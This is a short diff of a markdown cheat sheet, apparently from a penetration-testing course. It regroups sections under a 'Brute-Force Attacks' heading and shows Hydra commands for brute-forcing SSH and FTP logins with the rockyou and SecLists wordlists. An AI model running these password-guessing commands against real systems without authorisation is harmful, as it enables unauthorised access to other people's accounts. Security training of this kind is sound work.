@@ -1,4 +1,6 @@
-# Hydra
+# Brute-Force Attacks
+
+## Hydra
 
 | **Command**   | **Description**   |
 | --------------|-------------------|
@@ -9,7 +11,7 @@
 | `hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4` | SSH Brute Force - User/Pass Wordlists |
 | `hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1` | FTP Brute Force - Static User, Pass Wordlist |
 
-# Wordlists
+## Wordlists
 
 | **Command**   | **Description**   |
 | --------------|-------------------|
@@ -17,7 +19,7 @@
 | `/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt` | Common Passwords Wordlist |
 | `/opt/useful/SecLists/Usernames/Names/names.txt` | Common Names Wordlist |
 
-# Misc
+## Misc
 
 | **Command**   | **Description**   |
 | --------------|-------------------|
